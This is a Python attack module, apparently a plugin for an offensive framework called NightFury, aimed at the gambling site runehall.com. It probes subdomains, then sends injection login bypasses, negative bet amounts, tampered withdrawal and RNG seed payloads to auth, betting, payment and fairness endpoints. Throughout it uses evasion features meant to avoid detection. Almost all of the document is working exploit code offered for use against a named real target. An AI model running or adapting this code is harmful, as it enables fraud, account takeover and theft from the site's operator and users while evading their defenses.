import requests
import json
import random
import time
import threading
from core.base_module import BaseModule
from utils.polymorphic_wrapper import PolymorphicWrapper
from modules.exploit.advanced_evasion import AdvancedEvasionEngine

@PolymorphicWrapper.wrap_module
@PolymorphicWrapper.wrap_module
class RunehallPro(BaseModule):
    """
    Professional NightFury Plugin for runehall.com.
    Fully operational framework with advanced evasion and multi-vector exploitation.
    """
    def __init__(self, framework):
        super().__init__(framework)
        self.name = "runehall_pro"
        self.description = "Professional Runehall Exploitation Suite - High Performance & Evasion"
        self.evasion = AdvancedEvasionEngine()
        self.options = {
            "target": "runehall.com",
            "threads": "5",
            "evasion_level": "high",
            "vector": "all",  # all, auth, bet, payment, logic
            "auto_exfil": "true"
        }
        self.results = []
        self._lock = threading.Lock()

    def run(self, args):
        target = self.options.get("target")
        threads = int(self.options.get("threads", 5))
        vector = self.options.get("vector")
        
        self.log(f"Starting Professional Suite against {target}", "info")
        self.log(f"Evasion Level: {self.options.get('evasion_level')}", "info")

        vectors_to_run = []
        if vector == "all":
            vectors_to_run = ["auth", "bet", "payment", "logic"]
        else:
            vectors_to_run = [vector]

        subdomains = ["api", "play", "secure", "dev", "v1", "www", "beta", "auth"]
        
        # Phase 1: Intelligent Discovery
        discovered_endpoints = self._discover_endpoints(target, subdomains)
        if target not in discovered_endpoints:
            discovered_endpoints.append(target)
        
        # Phase 2: Targeted Exploitation with Evasion
        self.log(f"Discovered {len(discovered_endpoints)} potential endpoints. Starting exploitation...", "info")
        
        thread_list = []
        for endpoint in discovered_endpoints:
            for v in vectors_to_run:
                t = threading.Thread(target=self._test_vector, args=(endpoint, v))
                thread_list.append(t)
                t.start()
                
                if len(thread_list) >= threads:
                    for t in thread_list: t.join()
                    thread_list = []
        
        for t in thread_list: t.join()
        
        self._finalize_report()

    def _discover_endpoints(self, target, subdomains):
        discovered = []
        for sub in subdomains:
            url = f"https://{sub}.{target}"
            try:
                # Use evasion traffic patterns for discovery
                headers = self.evasion.generate_traffic_pattern_randomization()
                # Use a real user agent
                headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                # Try both HTTP and HTTPS for discovery
                for proto in ["https", "http"]:
                    url = f"{proto}://{sub}.{target}"
                    try:
                        resp = requests.get(url, headers=headers, timeout=3, allow_redirects=True)
                        if resp.status_code < 500:
                            discovered.append(f"{sub}.{target}")
                            self.log(f"Discovered active subdomain: {sub}.{target} ({proto})", "success")
                            break
                    except:
                        continue
            except:
                pass
        return discovered

    def _test_vector(self, host, vector_type):
        endpoints = {
            "auth": ["/v1/auth/login", "/api/v1/session/verify", "/auth/admin/login"],
            "bet": ["/api/v1/game/place-bet", "/v1/bet/submit", "/games/roulette/bet"],
            "payment": ["/api/v1/user/wallet/withdraw", "/v1/payments/history", "/api/v1/balance"],
            "logic": ["/v1/rng/seed", "/api/v1/game/provably-fair", "/v1/sync/nonce"]
        }
        
        if vector_type not in endpoints: return

        for path in endpoints[vector_type]:
            url = f"https://{host}{path}"
            
            # Generate polymorphic payload
            base_payload = self._get_base_payload(vector_type)
            payload_str = json.dumps(base_payload)
            
            # Apply evasion to the payload string
            payload = self.evasion.generate_polymorphic_payload(payload_str, technique='auto')
            
            # Apply protocol obfuscation and randomization
            raw_headers = self.evasion.generate_traffic_pattern_randomization()
            headers = {str(k): str(v) for k, v in raw_headers.items() if k != 'delay'}
            headers["Content-Type"] = "application/json"
            
            try:
                self.log(f"Testing {vector_type} on {url}...", "info")
                # Use real POST requests with randomized timing
                time.sleep(random.uniform(0.1, 0.5))
                resp = requests.post(url, data=payload, headers=headers, timeout=10)
                
                with self._lock:
                    result = {
                        "url": url,
                        "vector": vector_type,
                        "status": resp.status_code,
                        "length": len(resp.text),
                        "vulnerable": self._analyze_response(resp, vector_type)
                    }
                    self.results.append(result)
                    
                    if result["vulnerable"]:
                        self.log(f"CRITICAL: Potential {vector_type} vulnerability found on {url}!", "success")
            except Exception as e:
                self.log(f"Error testing {url}: {str(e)}", "error")

    def _get_base_payload(self, vector_type):
        if vector_type == "auth":
            return {"username": "admin", "password": {"$gt": ""}, "token": "' OR '1'='1"}
        elif vector_type == "bet":
            return {"amount": -1000000, "currency": "USD", "game_id": "slots"}
        elif vector_type == "payment":
            return {"account_id": "1", "action": "withdraw", "amount": 0.00000001}
        elif vector_type == "logic":
            return {"client_seed": "A" * 64, "nonce": -1}
        return {}

    def _analyze_response(self, resp, vector_type):
        # Professional response analysis beyond just status codes
        indicators = ["success", "authorized", "admin", "balance", "seed", "private_key", "root"]
        text = resp.text.lower()
        
        if resp.status_code == 200:
            for ind in indicators:
                if ind in text: return True
        
        # Check for error leakage (SQLi, Path Disclosure, etc.)
        error_indicators = ["sql", "mysql", "postgresql", "mongodb", "debug", "stack trace", "fatal error", "exception"]
        for ind in error_indicators:
            if ind in text: return True
            
        return False

    def _finalize_report(self):
        self.log("Exploitation phase complete. Generating report...", "info")
        vulns = [r for r in self.results if r["vulnerable"]]
        if vulns:
            self.log(f"TOTAL VULNERABILITIES FOUND: {len(vulns)}", "success")
            for v in vulns:
                self.log(f"  - {v['vector'].upper()} @ {v['url']} (Status: {v['status']})", "success")
        else:
            self.log("No critical vulnerabilities confirmed in this pass.", "warning")

if __name__ == "__main__":
    # Allow running as standalone for quick testing
    import sys
    class MockFramework:
        def log(self, msg, level): print(f"[{level.upper()}] {msg}")
    
    module = RunehallPro(MockFramework())
    module.run([])
